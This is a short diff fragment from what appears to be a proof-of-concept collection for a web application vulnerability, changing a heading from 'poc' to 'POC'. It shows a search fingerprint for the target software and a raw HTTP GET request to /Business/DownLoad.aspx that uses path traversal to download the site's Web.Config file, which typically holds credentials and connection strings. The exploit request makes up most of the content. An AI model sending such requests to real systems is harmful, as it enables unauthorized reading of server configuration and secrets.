@@ -10,7 +10,7 @@ body="/ajax/LVS.Core.Common.STSResult,LVS.Core.Common.ashx"
 
 
 
-## poc
+## POC
 
 ```
 GET /Business/DownLoad.aspx?p=UploadFile/../Web.Config HTTP/1.1
